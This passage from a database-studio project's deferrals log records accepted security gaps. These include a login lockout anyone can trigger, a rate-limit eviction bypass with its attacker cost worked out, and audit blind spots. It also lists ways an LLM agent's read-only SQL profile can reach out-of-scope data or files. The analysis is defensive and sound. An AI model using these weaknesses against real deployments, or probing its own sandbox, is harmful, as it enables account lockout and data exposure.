document route is statically prerendered (verified — nonce-less `self.__next_f.push` scripts baked into
`.next/server/app/index.html` and siblings), and a per-request nonce cannot be applied to prerendered
HTML.

The plumbing exists on both sides. Next reads a nonce from the `script-src`/`default-src` directive of
a CSP header the app supplies, and Monaco's loader supports `loader.config({ cspNonce })`
(`public/monaco/vs/loader.js`).

The experiment, so nobody re-derives it: force dynamic rendering on the root layout, thread the nonce
into the Monaco loader config, then measure what the lost prerendering costs in cold-start time and in
the channels that serve Studio from a small box.

**Done when:** the measurement says the trade is worth it and the nonce ships, or the measurement is
recorded here as the reason it does not.

### H2. A 429 should produce a Retry-After-aware toast

`src/hooks/use-query-execution.ts` already reads `.error` from any non-ok body, so a rate-limited
request shows its message. It does not read the `Retry-After` header and tell the user how long to
wait.

**Done when:** the toast names the wait.

### H3. Audit events do not record a user agent

`AuditEvent` (`src/lib/audit.ts`) deliberately has no `userAgent` field. It is attacker-controlled free
text with marginal value for a single-operator product, and adding it means adding the redaction
question the closed `AuditReason` union exists to avoid.

**Done when:** a real investigation needs it, at which point it is added as a truncated, explicitly
allowlisted field.

### H4. The `@libredb/studio/security` usage note is not in the published README

An npm consumer reading `README.md` on npmjs.com sees nothing about `securityHeaders()`.

It used to live in `.claude/rules/platform-integration.md`, which was deleted with the
platform/studio decoupling, so there is no longer a second home for it at all.

It is out of `README.md` because `README_zh.md` and `README_ja.md` (`scripts/readme-check.mjs`'s
`LOCALIZED` pair) would then drift, and that script guards the pair structurally rather than by
heading.

**Done when:** the note lands in all three READMEs together.

### H5. No env var can turn HSTS off, and that is deliberate

`readSecurityHeaderOptions()` always sends `Strict-Transport-Security`. Unlike `CSP_REPORT_ONLY` there
is no `HSTS_DISABLE`, and one should not be added in the shape an operator would expect.

An escape hatch that merely *stops sending* the header is useless against the failure it would be
built for. A browser that already cached the HSTS pin keeps enforcing HTTPS-only for the remainder of
the 180-day `max-age`, whatever the server does next. And a server that has reverted to plain HTTP may
not be reachable by that browser at all, because HTTPS-only means the plain-HTTP origin is refused
before any response body is read.

The only hatch that works emits `Strict-Transport-Security: max-age=0` over a still-live HTTPS
listener, which is what tells a visiting browser to drop the pin.

**Done when:** a real report of a stuck pin needs this, at which point it is a `max-age=0` mode, never
a header omission.

### H6. A coverage phantom recurs wherever a rarely-covered function has a multi-line inline param type

`scripts/merge-lcov.mjs` picks one "authority" record per source file — whichever test run has the most
executed lines — to decide which lines are coverable (`docs/TOOLCHAIN.md`).

A function with a multi-line inline parameter type (`function f(opts: { a?: string; b?: string; … })`)
exercised by only one test file reads as fully covered, because that file wins the authority vote.
Adding a second test file that exercises a large *new* surface in the same source file — without ever
calling that function — can tip the vote. The new file's own run reports the old function as a coarse,
never-executed block whose zero-hit lines include the parameter type's continuation lines. It looks
like a coverage regression in code nobody touched.

`src/lib/audit.ts`'s `AuditRingBuffer.filter` hit this during Phase 1. Extracting the inline type to a
module-scope interface fixed it permanently, because module-scope type members are erased before any
function's coverage span exists.

**The general fix:** hoist a multi-line inline parameter or return type to a module-scope
`interface`/`type`. Do not chase it by adding a test that calls the under-covered function for
coverage's sake.

### H7. `sanitizeAuditInput` does not recurse, so a nested secret survives inside the coerced string

`sanitizeAuditInput` used to sanitize a value only when `typeof value === "string"`, silently skipping
everything else. That was corrected for I3 of the Phase 1 review: a top-level value that is neither a
string nor `duration`'s legitimate number is now coerced to a string (`JSON.stringify`, then the same
`sanitizeAuditField` a real string goes through).

That fix mattered more than the original entry claimed. It said the risk was "bounded to the ring
buffer, not stdout, because `toAuditLine`'s allowlist never re-serializes an unknown property". True
for `details` specifically, false as a general rule: `target`, `user`, `action`, `connectionName`, `ip`
and `bucket` are all allowlisted onto the stdout line, all string-typed, and all reachable with a
non-string runtime value the same way `POST /api/db/maintenance`'s `target` was.

The residual is narrower. Coercion is whole-value, not recursive per-key redaction.
`sanitizeAuditField`'s credential pattern only recognizes a URI-shaped `scheme://user:pass@host`
substring, so a nested secret under an arbitrary key name (`{"apiKey": "sk-live-…"}`) is bounded and no
longer breaks the shape contract, but is not specifically redacted. It survives, truncated, inside the
JSON-stringified value.

**Done when:** nested plain objects are walked key-by-key, at bounded depth, so a non-URI-shaped nested
secret gets the same by-key-name scrutiny a top-level one does. Note that no such scrutiny exists for
any field today, top-level or nested — this is a new capability, not a gap being closed.

### H8. Lowest-count eviction lets an attacker buy back a `login_account` guess

From `pruneIfAtCapacity`'s doc comment in `src/lib/api/rate-limit.ts`: an attacker can buy back one
guess against an established `login_account` target sitting at count N for roughly
`(MAX_ENTRIES_PER_BUCKET - 1) × N` decoy requests. Not a flat `MAX_ENTRIES_PER_BUCKET - 1`, because
each of the ~999 decoys must itself be raised from 0 to N before the tie-break can fire.

At the bucket's default (20), a target one guess from tripping sits at count 20 — `decide()` checks
`entry.count >= limit.max` before incrementing — so it costs on the order of 999 × 20, about twenty
thousand decoy requests. The tie-break favours evicting the earliest-inserted member of a tied group,
and the target, created before its decoys, always is.

A real linear cost multiplier, not a bypass. Unlike a tripped bucket it produces no
`rate_limit_exceeded` audit event, so an operator watching only the audit trail would not see it.

Accepted for Phase 1: the lowest-count policy is itself the fix for a worse bypass (an attacker
evicting a target's entry for free before it can accumulate any cost), and the two alternatives
considered each introduced a worse flaw.

**Done when:** a cheaper, audit-visible eviction policy is found that does not reopen the oldest-first
bypass.

### H9. `admin/fleet-health`'s per-request fan-out width is unbounded by the route guard

`src/app/api/admin/fleet-health/route.ts` shares the `query` rate-limit bucket via `guardRoute`, like
every other database-reaching route. The guard limits *request rate*, not *fan-out width*: the handler
runs `Promise.all(connections.map(...))` over whatever `connections` array the caller's JSON body
names, with no upper bound on its length.

One admin-authenticated (or stolen admin) POST can open and health-check an arbitrarily large number of
connections concurrently. The per-request rate limit does not touch it, because it is a single request
however large its body is.

**Done when:** the handler caps the array length (a `400` above some bound) or chunks the fan-out,
whichever the real usage pattern supports.

### H10. The route-guard allowlist verifies existence, not truth

`ROUTES_WITHOUT_A_PROVIDER` in `tests/security/route-auth.test.ts` maps a route key to a one-line
reason the route is exempt from the "requires a session" sweep. The only automated check on it confirms
each key matches a real route on disk. It does not verify that the *reason* is still true.

Nothing greps an allowlisted route's file for a provider import (`@/lib/db`, `getOrCreateProvider`,
`createLLMProvider`, …). So a future edit that adds a provider call to one of these routes — say
`storage/migrate` growing a database-backed feature — would silently escape the sweep the allowlist
exists to police. Exactly the failure mode the enumeration was built to catch for undiscovered routes.

**Done when:** a second, independent check greps each allowlisted file for provider-reaching imports
and fails loudly if one appears.

### H11. `login_account`'s hard cap is an accepted denial-of-login handle on a known account

The `login_account` bucket is keyed on `hmacHex(submittedEmail)`, which makes it immune to
`X-Forwarded-For` spoofing. It throws before the credential comparison runs, and is cleared only by a
*successful* login — which cannot happen while it is tripped.

So anyone who knows or guesses a real address can lock that account out for the rest of the window with
the bucket's default (20 wrong guesses), and renew the lockout indefinitely at roughly one guess per
window. The published default `admin@libredb.org` when `ADMIN_EMAIL` is unset makes this free.

`login_client`, the address-keyed bucket, does not help: it is bypassed in any topology where an
attacker can set or rotate `X-Forwarded-For` — direct exposure, or a proxy that appends rather than
overwrites (Caddy and Traefik defaults, and the common nginx `proxy_add_x_forwarded_for` recipe).

This is inherent to a hard per-account cap. Bounding brute force against an operator-set password and
bounding this lockout are in direct tension, and no design removes one side without giving up the
other. `.env.example` documents `RATE_LIMIT_LOGIN_ACCOUNT_MAX=0` as the break-glass (verified:
`decide()` returns `allowed: true` unconditionally for `max === 0`, for both `peekRateLimit` and
`consumeRateLimit`, so the bucket is fully inert). Phase 1 narrowed the window from 900 to 300 seconds
to shrink the blast radius without loosening the guess ceiling.

**Done when:** a design keeps this bucket immune to header spoofing without also being a stranger's
denial-of-login switch. Unknown at the time of writing.

### H12. A role-based denial is never audited, and `insufficient_role` has no emitter

`AuditReason` includes `insufficient_role` in its closed union, and no call site ever constructs an
event with it. Every denial the audit trail records is a SESSION or ORIGIN check failing — `no_session`
from `guardRoute`, `origin_mismatch` from the proxy's Origin check — not a ROLE check failing for an
already-authenticated caller.

Five call sites, no audit line between them:

- `GET` and `POST /api/admin/audit`
- `POST /api/admin/fleet-health`
- `POST /api/db/maintenance`
- the proxy's own `/admin` RBAC redirect, which silently sends a non-admin token to `/`

An admin session, or a stolen one, probing for a role it does not hold leaves no trace in the one
channel this project treats as authoritative.

**Done when:** each of the five emits a `permission_denied` event with `reason: "insufficient_role"`,
the same pattern `guardRoute` already uses for `no_session`.

### H13. No rate-limit bucket is a global, unkeyed ceiling — on purpose

Every bucket in `src/lib/api/rate-limit.ts` is keyed on something the caller supplies:
`login_client`/`anon` on the derived client address (attacker-controlled in any topology without a
correctly configured `TRUSTED_PROXY_HOPS`), `login_account` on a hash of the submitted email (fully
attacker-chosen, see H11), `query`/`ai` on the session's username.

A global, unkeyed ceiling is the one shape that cannot be evaded by picking a favourable key, because
there is no key to pick. Phase 1 does not add one, deliberately: a global ceiling on `login_client` or
`anon` turns one attacker's flood into a lockout for every other concurrent user of the same bucket,
which is strictly worse than the keyed floods it would prevent. And getting the sizing right — loose
enough not to bite a legitimate multi-tenant deployment, tight enough to bound an attacker — is its own
design problem this wave did not scope.

**Done when:** a real, measured flood makes the keyed buckets' residual insufficient and a global
ceiling's sizing can be grounded in that data rather than guessed.

---

## Security Phase 2 deferrals

Each was decided during Phase 2, not overlooked. Lettered `C` (supply **C**hain) because the SQL
section already owns `S1`–`S8`.

### C1. No scan check is a required check

Branch protection requires `Lint, Typecheck and Build` and `Unit & Integration Tests`. Phase 2 adds
three scan jobs and promotes none: promoting a check is a branch-protection change the owner makes,
and two of the three consult a vulnerability database rebuilt every six hours, which would import that
schedule into the merge gate.

**`Secret Scan` is the one candidate.** Its verdict is a pure function of the scanned commit range and
the pinned gitleaks digest, it needs no secrets so it works identically for fork pull requests, and it
scans a PR's commits in about 75 milliseconds.

**Done when:** the owner promotes it, or this entry records why not.

### C2. A failing scheduled scan notifies nobody but the owner

`security-scan.yml`'s daily run fails when a critical fixable advisory lands, and GitHub emails the
repository owner for a failed scheduled run. That is the whole notification path.

`helm-index-check.yml` shows the alternative in this repository — a job with `issues: write` that
maintains a single rolling issue. It was not copied here because an auto-filed issue per advisory is
how a security label becomes noise.

**Done when:** a real missed advisory shows the email is insufficient, at which point the rolling-issue
pattern is the thing to copy.

### C3. The image SBOM is a 30-day workflow artifact, not a durable asset

It cannot be a release asset: `release-artifacts.yml` publishes the release before dispatching
`docker-build-push.yml`, and immutable releases (#154) freeze the asset set at publish time.

Nothing is lost that cannot be recovered — it is regenerable by anyone from an immutable public digest
with one Trivy command, documented in `SECURITY.md`. What is missing is convenience and an attestation.

The clean fix is a buildx SBOM attestation (`sbom: true` on `docker/build-push-action`), which attaches
it to the image manifest. Not taken in Phase 2 because it adds a step, and a failure mode, to the
release-path Docker build — the most fragile CI surface here.

**Done when:** the release chain has been quiet for a few releases and the change can be validated with
a `workflow_dispatch` backfill first.

### C4. No SBOM covers the operator image

`operator-release.yml` builds a controller image that wraps the chart. Phase 2 touched no release
workflow other than `release-artifacts.yml`, and the operator image has a different lifecycle and a
different consumer (OpenShift OperatorHub, which does its own scanning).

**Done when:** a certification requirement asks for one.

### C5. Dependabot raises version updates but cannot raise security ones

`.github/dependabot.yml` groups weekly version updates across Bun, GitHub Actions and both
Dockerfiles. Bun is its own `package-ecosystem`, not part of `npm` — the config shipped in #375 said
`npm`, whose updater cannot see `bun.lock`, so five bot PRs bumped `package.json` alone and died on
`--frozen-lockfile`.

What Dependabot still cannot do is the other half: its Bun support covers **version updates only**.
Security updates are not implemented upstream for this ecosystem. So an advisory against a package Bun
resolves reaches nobody automatically. Trivy and `bun audit` are the only things that see it, and
acting on one is a human step.

That is also why several dependencies are excluded from the bot, each with its reason in the config:
database driver majors (mocked in tests, so a wire-behaviour change goes green — ioredis 6's RESP3
default is the live case), the exact-pinned agent runtime (a bump fails
`tests/unit/agent-dependency-boundary.test.ts` by design), `@zumer/snapdom` (pinned for ER-diagram
export fidelity), and the `oven/bun` base image (its version lives in the Dockerfile tag and the
workflows' `bun-version` input, which Dependabot cannot see as one).

**Done when:** Bun security updates land upstream and the exclusion list can be re-read against what
they cover.

### C6. `bun audit` cannot answer "is there a fix"

It reports severity and vulnerable ranges and no fixed version, which is why Trivy owns the gate and
`bun audit` is a job-summary second opinion. If bun adds fixed-version data, the container dependency
in the local contributor workflow could be dropped entirely.

**Done when:** `bun audit --json` carries a fix field.

### C7. The release SBOM does not describe the bundled Node.js runtime

`packaging/linux/fetch-node.sh` and `packaging/windows/fetch-node.sh` download a pinned Node.js build
and bundle it into every packaged artefact except the npm package: the standalone tarballs, the Windows
zip, the `.deb` and `.rpm`, the snap, the AppImage and the desktop package.

That runtime is the largest single binary in most of them, it is fetched by a shell script rather than
resolved from a lockfile, and the CycloneDX SBOM Trivy generates from `bun.lock` never sees it. The
document's only `node`-named component is `pkg:npm/@types/node`, a type-declarations package.

`SECURITY.md` now says the SBOM covers "the dependency closure of" those artefacts rather than the
artefacts themselves, which is the honest claim. This entry is the gap behind it.

**Done when:** the bundled runtime's version and provenance appear in the SBOM or a sibling document —
a second Trivy pass over the `fetch-node.sh` pinned version, or a hand-maintained component entry.

### C8. No artefact root declares that part of the distribution is not MIT

`LICENSE` states the project's own MIT terms, and nothing at the root of any packaged artefact says
that not everything inside is under those terms. Two kinds of obligation sit behind that.

**Routine attribution.** A scan of the installed tree (1169 distinct packages) puts 1136 under MIT,
Apache-2.0, ISC or BSD, all of which want the copyright notice to travel with redistributed copies.
Two carry attribution as their whole purpose: `caniuse-lite` is CC-BY-4.0 and the `geist` font is
under the SIL Open Font License.

**Share-alike.** `seed-assets/sqlite/employee.db` is CC BY-SA 3.0. That was handled deliberately —
`seed-assets/sqlite/ATTRIBUTION.md` records the provenance, the license, the modifications made here
and the fact that the file is redistributed under the same terms. But the file ships in the image (the
runner stage copies `seed-assets` explicitly) and in the packaged tarballs, and nothing at the root of
those artefacts points at that nested ATTRIBUTION.md. A reader of the image sees an MIT `LICENSE` and
a CC BY-SA database with no note connecting them.

**Done when:** a generated `NOTICE` (or `THIRD_PARTY_LICENSES`) ships at the root of the image and the
tarballs, names the sample database's separate terms explicitly, and is regenerated from the lockfile
rather than hand-maintained.

### C9. `elkjs` is EPL-2.0 and a direct production dependency

Every other direct production dependency is permissive. `elkjs@0.11.1` is EPL-2.0 — a file-level
reciprocal license with a patent-retaliation clause — and it is ours by choice rather than transitive:
the schema diagram's layout worker imports it at
`src/components/schema-diagram/elk.worker.ts`.

It is used unmodified, which is the case EPL-2.0 is comfortable with, so nothing is wrong today. But
the distributed bundle is MIT-plus-EPL rather than MIT, and that is a question an acquirer's counsel
asks rather than overlooks.

Recorded rather than acted on because the alternatives are worse: ELK is the only layout engine in the
ecosystem that produces the layered orthogonal routing the ER diagram depends on.

**Done when:** the mixed terms are stated openly (alongside C8, the natural place), or a permissive
layout engine proves it can match the output.

### C10. The last DOMPurify advisories are held open by Monaco's pin

`dompurify` via `monaco-editor` is the only advisory chain that reaches a user. Everything else
`bun audit` reports — `minimatch`, `brace-expansion`, `flatted`, `picomatch`, `esbuild`, `@babel/core`,
`undici` — arrives through `eslint`, `typescript-eslint`, `knip`, `tsup`, `workflow` and `@ai-sdk/*`,
and none of it is in the image. `undici` was checked specifically, because the agent runtime sits in
`devDependencies` by design yet reaches the standalone build: building with `DOCKER_BUILD=true` shows
no `undici` anywhere under `.next/standalone`, since `@ai-sdk/provider-utils` reaches it through a
`createRequire` call that output tracing cannot follow.

#374 moved the shipped copy from 3.2.7 to 3.4.8 by upgrading Monaco itself, clearing 14 of the 17.
**Four remain** on GitHub Advanced Security's count, and none can be closed here: they need 3.4.9,
3.4.11, 3.4.12 and 3.4.13. Monaco pins dompurify exactly, and 0.56.0 is its newest release.

**Do not "fix" these with a `package.json` override.** Monaco ships DOMPurify inlined in its prebuilt
`min/vs` bundle and nothing in `src/` imports the package. An override would change a lockfile entry no
shipped code reads, leave the bundle byte-identical, and turn `bun audit` and Trivy green at once. The
GHAS findings land on `bun.lock:<line>`, which is the tell: every one of those tools reads the
manifest, not the artefact.

Two related non-findings, so they are not re-derived. `dompurify` is dual-licensed (MPL-2.0 OR
Apache-2.0), so the copyleft half can simply not be chosen. And the LGPL-3.0 `@img/sharp-libvips-*`
binaries never reach the runtime image, because the runner stage copies `node_modules` selectively and
nothing in `src/` uses `next/image`.

**Done when:** Monaco ships a dompurify at or past 3.4.13. Re-check on each Monaco release, and verify
by grepping the staged bundle for the version literal rather than trusting the lockfile.

---

## Security Phase 3 deferrals

Each was decided during Phase 3, not overlooked.

### K1. Nothing stops a new route from bypassing the authoritative audit channel

`src/lib/audit.ts` exports `emitAuditEvent` (ring buffer **and** the `libredb.audit.v1` stdout line)
and `getServerAuditBuffer`. `POST /api/admin/audit` legitimately uses the second on its own: its body
is client-supplied and must never gain authority over the authoritative channel.

Nothing prevents a future route from doing the same by accident. An event pushed straight to the buffer
is visible in the admin UI, invisible to every log pipeline, and no test notices. The existing tests
pin the CONTENT of the stdout line, not the set of call sites permitted to skip it.

**Done when:** a check enumerates `getServerAuditBuffer(...).push(` call sites across `src/` and fails
on any that is not on a short, commented allowlist — the same inversion
`tests/security/route-auth.test.ts` applied to route discovery, where a hand-curated list had already
lost eleven routes.

### K2. A legacy plaintext password shaped exactly like an envelope is treated as corruption

`src/lib/storage/encryption.ts`'s `readSecret` treats a three-segment value whose first segment matches
`/^v\d+$/` as an envelope. A password stored before this feature existed that happens to be literally
`v1:<base64url>:<base64url>`, with a 12-byte first segment and a second of at least 16 bytes, is
classified `undecryptable` and omitted.

The compounded probability is negligible and the failure is recoverable: the connection survives and
the user retypes the password once. The alternative — passing an unrecognised value through — would hand
`v1:abc:def` to a driver as a password.

**Done when:** the envelope format is versioned forward for an unrelated reason, at which point a
longer, non-colliding prefix costs nothing.

### K3. `STORAGE_ENCRYPTION_KEY` is validated at first write, not at boot

`src/lib/config/auth-preflight.ts` validates `JWT_SECRET` at startup, so a short one stops the server
rather than producing a green health check and a 503 on every login. `STORAGE_ENCRYPTION_KEY` has no
equivalent: a value shorter than 32 characters throws only at the first storage write, which is after
login, after the migration attempt, and only in server storage modes. It surfaces as a `syncError` in
the UI rather than a boot failure.

**Done when:** the preflight also reads `STORAGE_ENCRYPTION_KEY` — staying silent when
`STORAGE_PROVIDER` is `local`, where the variable is inert and an error would be wrong.

### K4. Rotating the key back does not recover credentials once the app has written

`decryptConnections` omits an unreadable secret and keeps the record, which is correct: dropping the
record would be persisted as a deletion. But the omission is only recoverable until the next write.
`useStorageSync` is a write-through cache, so the first push of the `connections` collection after a
failed read overwrites the ciphertext with a record that has no password field at all.

The warning fires on READ, which is before any write, so an operator who reads their logs promptly has
a window.

Making the window unnecessary would mean reading the stored row before every write and preserving an
existing envelope when the incoming value is absent — which would also silently resurrect a password the
user deliberately cleared. A worse bug than the one it fixes.

**Done when:** a design distinguishes "the client never had this value" from "the client cleared this
value" without adding a field to the stored shape.

---

## Agent M1 deferrals (#328)

Each was decided while building the operation/policy layer, not overlooked.

### A1. A SQLite agent statement can block the runtime for its whole duration

`sqlite.ts`'s `queryReadOnly` enforces `statementTimeoutMs` as a post-execution deadline: the result of
an overrunning statement is refused, but the statement is never preempted. SQLite has no
transaction-local statement timeout, and neither `bun:sqlite` nor `node:sqlite` exposes
`sqlite3_interrupt` or a progress handler.

Because both drivers are synchronous, a hostile recursive CTE blocks the whole runtime while it runs.
Same property as the normal SQLite query path, but the input source differs in kind: there the SQL
comes from an authenticated operator, here from an agent.

**Done when:** either driver exposes an interrupt/progress hook, or agent SQLite execution moves to a
worker that can be killed on deadline.

### A2. `VACUUM INTO` can create an empty file at an agent-chosen path

The SQLite agent profile's read-only open governs the target database file only. `VACUUM INTO '<path>'`
writes to a *different* file and is refused by `PRAGMA query_only`, which the profile re-asserts and
verifies before every statement. But SQLite creates the destination file before the write is refused,
so a zero-byte file can appear at any path the server process can write to. No data reaches it —
asserted on both adapters by file size.

Closing this needs an authorizer callback, which `bun:sqlite` does not expose at all.

**Done when:** a control exists on both adapters, or agent SQLite targets are constrained to an
allowlisted directory. (The base-dir allowlist idea came from #125, now closed.)

### A3. Out-of-scope READS have no database-native control on either provider

Both agent profiles bound what a statement can WRITE with a database-native control. What it can READ
is bounded only by the policy layer's declared-target allowlist plus the input-stage statement guard,
and both of those read SQL — defense in depth, not a boundary:

- **SQLite:** `ATTACH` of an *existing* file succeeds on a read-only handle and its rows become
  readable. No authorizer exists on `bun:sqlite` (`docs/providers/sqlite.md` §12.3).
- **PostgreSQL:** the read-only role can read every table its grants allow, whatever catalog or schema
  the request declared. Per-table `SELECT` grants are the only real bound
  (`docs/providers/postgres.md` §12.3).

**Done when:** out-of-scope reads are refused by something that does not read SQL — a per-target grant
set generated for the agent role, an allowlisted directory for SQLite, or an authorizer both adapters
expose.

### A5. The PostgreSQL profile's regression tests model the server rather than run one

`tests/integration/db/postgres-provider.test.ts` proves the read-only profile against a stateful
hand-written engine mock. Every rule it models was verified against a live PostgreSQL 18 while the
profile was built — read-only transaction rejection by engine state, the extended-protocol refusal of
multi-command strings, `SET TRANSACTION READ WRITE` really relaxing the transaction, advisory locks
surviving rollback — and the mock encodes them faithfully enough that bypass attempts fail on real
modeled behaviour (a write actually landing) rather than on protocol metadata.

What it cannot catch is a regression on the other side of the seam: a driver change, a server version
that behaves differently, or a `pg` option that stops meaning what it meant. The assertions would stay
green because the mock, not the server, defines the semantics.

The integration suites are mock-based by convention and CI runs no database service. The only real
engine in the pipeline is the throwaway PostgreSQL container behind
`loop/scripts/functional-smoke.sh`.

**Done when:** a container-backed test proves, against a supported PostgreSQL, that a direct write and
a multi-command escape are rejected through the profile under the resolved role. Cheapest path is
extending the functional-smoke container, not adding a service to every CI test job.

### A6. Druid's hand-written bigint serializer predates the Node 24 floor

`druid/http-transport.ts` splices the parameters array into the query envelope by hand so a `bigint`
literal reaches Druid unquoted. The reason recorded in `docs/providers/druid.md` was that
`JSON.rawJSON` (ES2025, V8 12.4 / Node 22.2) could not be depended on while `engines.node` was
`">=20.9.0"`.

That constraint is gone: #326 raised the floor to `">=24.0.0"`. The hand-serializer is not wrong and is
fully covered, so it was left alone rather than rewritten inside a runtime-baseline change — swapping a
correctness-critical escaping path belongs in a change whose tests are about that path.

**Done when:** the splice is replaced by `JSON.rawJSON` with the existing bigint fixtures still green,
or this entry is deleted with a note that the hand-serializer is preferred.

> TypeScript 7 was the seventh entry here. It is the same finding as P2, which now carries it.

---

## Agent M2 deferrals (#329)

### B1. A module-private credential map would be invisible to the agent state guard

`src/lib/agent/state-guard.ts` derives its credential key names from `SECRET_FIELD_MAPS` in
`src/lib/storage/connection-secrets.ts`, so a field promoted to `secret` in one of the three
classification maps is covered without an edit. The aggregate itself is a hand-maintained array: each
individual map fails `bun run typecheck` when a field goes unclassified, but nothing makes a fourth MAP
appear in the array.

The direction that loses coverage silently is ADDING a map, not removing one — the storage layer would
seal the new field while the guard happily persisted it. `tests/unit/lib/agent/state-guard.test.ts`
closes that by reflection: it walks the storage module's exports, recognises a classification map
structurally, and fails when one is not registered. Verified to fire by temporarily exporting a fourth.

What remains is narrower. The check sees **exported** maps only. A map kept module-private and wired
straight into `walkConnection` is invisible to it. All three existing maps are exported for consumers,
so this is a convention rather than an enforced rule.

**Done when:** a new classification map cannot be added without the guard learning about it — most
directly by having `walkConnection` iterate a registry instead of three derived key lists. That
registry has to carry each map's nesting location (root, `ssl`, `sshTunnel`), so it is a change to a
security-critical encrypt/decrypt path with its own test obligations.

### B2. The Anthropic provider kind is ratified and installed, but not offered

`@ai-sdk/anthropic@4.0.37` is an owner-ratified dependency and is installed, and the agent's
`provider-registry.ts` could serve it in a few lines.

What blocks it is not the agent. The registry is keyed on `LLMProviderType`, the settings surface's own
union (`src/lib/llm/types.ts`), and that union is what `LLM_PROVIDER` resolves against. Adding
`anthropic` there makes `LLM_PROVIDER=anthropic` selectable for the whole application, and
`src/lib/llm/factory.ts` would then have to build a chat provider for it or throw — breaking every
surface that resolves a provider through the factory, for exactly the users who configured it.

Serving it properly means a `src/lib/llm/providers/anthropic.ts` that speaks Anthropic's Messages
streaming protocol. `createSSEParser`'s `extractContent` understands the OpenAI delta shape only, and
Anthropic requires `max_tokens` on every request while `LLMStreamOptions.maxTokens` is optional, which
needs a default nobody has chosen. That is a chat-surface feature with its own conventions, tests and
release note. The ratified package cannot be used for it either: `src/lib/llm` is reachable from the
published package while the AI SDK is deliberately not
(`tests/unit/agent-dependency-boundary.test.ts`).

Until then `@ai-sdk/anthropic` stays in `knip.json`'s `ignoreDependencies` as an installed-but-unwired
ratified package, which that test's allowed-ignore set names explicitly.

**Done when:** the chat surface gains an Anthropic provider under its own conventions and the registry
gains the matching adapter in the same change. The `Record<LLMProviderType, AgentProviderAdapter>` will
not compile until it does.

### B3. A scope allowlist on a target dimension denies every tool that cannot declare it

`withinAllowlist` (`src/lib/db/operations/policy.ts`) refuses a call that does not DECLARE a dimension
the scope constrains. That is the right direction — an undeclared target cannot be screened, so it fails
closed. The consequence is that a scope carrying an allowlist silently narrows the tool set to the
tools that happen to declare that dimension:

- **A `schema` allowlist** admits only a NARROWED `inspect_schema` call, one that was given a selector.
  The selector-less full inventory declares nothing and is denied (verified:
  `createTargetScope("c", { schemas: ["public"] })` plus `inspectSchemaTool(ctx, {})` answers
  `TARGET_OUT_OF_SCOPE`). That is the natural first call, and the one the run-start snapshot makes:
  `captureContextSnapshot` asks for each catalog kind with no selector, so under a schema allowlist
  every run's context capture is refused and the run proceeds with no snapshot at all. It fails closed
  and the model is told to inspect the schema itself, but a run scoped to one schema never gets an
  inventory. Narrowing the capture to the scope's own single-entry allowlist is the obvious repair.
  Every `run_read_query` and `inspect_plan` call is denied outright, because a raw statement cannot
  declare which schema it will touch without parsing it.
- **A `catalog` allowlist** denies EVERY call in the layer: no tool declares that dimension at all.

Nothing builds such a scope yet. `runtime.ts` calls `createTargetScope(connectionId)` with no
dimensions, so no allowlist is ever constrained in production. This is a property of the layer rather
than a live defect, and the tool layer records it at the `inspect_schema` target declaration.

It matters because the failure looks like a policy bug rather than a scoping choice: the model gets
`TARGET_OUT_OF_SCOPE` with advice to ask for an in-scope target, and for a raw read there is no way to
comply.

Two honest resolutions when a caller first needs scoping, and the choice is a product one: give
`run_read_query` an optional declared-schema argument and require it when the scope constrains that
dimension, or let the run service refuse to start a run whose scope constrains a dimension its tool set
cannot declare — louder, and needs no per-tool argument.

**Done when:** a scope with a schema or catalog allowlist produces a coherent outcome for every tool the
mode offers, with a test per dimension.

### B4. `mapDatabaseError` discards the text that distinguishes a timeout cancel from an operator cancel

`mapDatabaseError` matches `canceling statement` before its timeout branch and returns
`new QueryCancelledError("Query was cancelled", provider, query)`, replacing the engine's own wording.
PostgreSQL says `canceling statement due to statement timeout` for a `statement_timeout` and
`canceling statement due to user request` for `pg_cancel_backend`. After this mapping **no** consumer
can tell them apart. The discriminator is gone, not merely unexamined.

That is why the agent tool layer classifies a cancel as a repairable statement failure: the reachable
case on the agent path is the timeout this layer itself installs via `SET LOCAL statement_timeout`, and
narrowing the read is the repair that helps. The cost is stated there — an operator cancel arriving
mid-statement is also offered a repair, so a run cancellation has to be enforced by the run loop's own
persisted state between tool calls rather than by expecting the driver's cancel to propagate.

The fix is in shared code and has editor-visible consequences, which is why it is not in #329.
Reordering the timeout check ahead of the cancellation check, or preserving the original message on
`QueryCancelledError`, changes what the query panel shows when a statement is cancelled versus times
out. The reordering is the substantive one and needs the editor's cancel/timeout UX re-checked
(`postgres.ts` sets `queryTimeout` on the pool as well, so both paths exist).

**The same mapper has a wider imprecision, and the agent's repairable-versus-environment split inherits
it.** Classification is **substring** matching on the engine's message, so an identifier can decide the
class. Verified against the live mapper:

- `no such table: pooled_items` matches `pool` → `PoolExhaustedError`. A plainly repairable missing
  relation is treated as an environment fault and ends the run.
- `Connection terminated unexpectedly` matches nothing → base `DatabaseError`. A dead socket is offered
  to a model as a statement it could rewrite (bounded at three attempts).
- `relation "user_passwords" does not exist` matches `password` → `AuthenticationError`. Harmless on the
  agent path today only because a query-phase `AuthenticationError` is repairable there, which is a
  coincidence rather than a design.

Neither direction is a boundary failure: nothing runs that policy did not allow, and the statement and
repair budgets still bound the waste. What is wrong is the diagnosis, and it is wrong before any
consumer sees the error, so no consumer can correct it.

**Done when:** a statement timeout and a user cancellation are distinguishable by type or by preserved
message, with the editor's consumers updated and the agent's cancel classification revisited against
the new signal — and when classification no longer depends on a substring a table or column name can
satisfy. Driver error codes (PostgreSQL `SQLSTATE`, SQLite `errcode`) are the signal that does not
collide, and each provider already has access to its own.

### B5. The agent run ledger assumes one writer per run, and cannot enforce it

`run-store.ts` and `run-service.ts` are append-only over the durable world's stream primitives, which
offer no compare-and-append: a writer cannot say "append this only if the stream is still at index N".
Every operation is read-then-append. Two consequences follow that a single-writer run never meets:

- **Two concurrent opens on one caller-supplied run id write two headers.** The fold refuses a ledger
  with a second header (`MALFORMED_LEDGER`), permanently, for every later read. The race does not
  resolve in one side's favour — it bricks the run. Nothing minted internally can collide (UUIDv4, 122
  random bits), so reaching this needs a caller that supplies its own id, which is what the
  workflow-run-id path does.
- **Two loops driving one running run would both perform the same step.** `runStep` reads the ledger,
  sees the step neither settled nor invoked, and appends its invocation. Two readers of the same state
  both pass that check. The write-ahead ordering makes a step at-most-once *per loop*, not *per run*.
  The milestone's "no tool execution performed twice" criterion is about a restart, where the dead
  process is gone by construction, and that case is genuinely covered.

Not defended at the storage layer because every cross-process defence available is worse than the
constraint: a lock file is single-instance only (which the Postgres backend exists to escape), and a
lease in the ledger is a distributed-lock design with its own expiry semantics. Single ownership of a
running workflow belongs to the layer above.

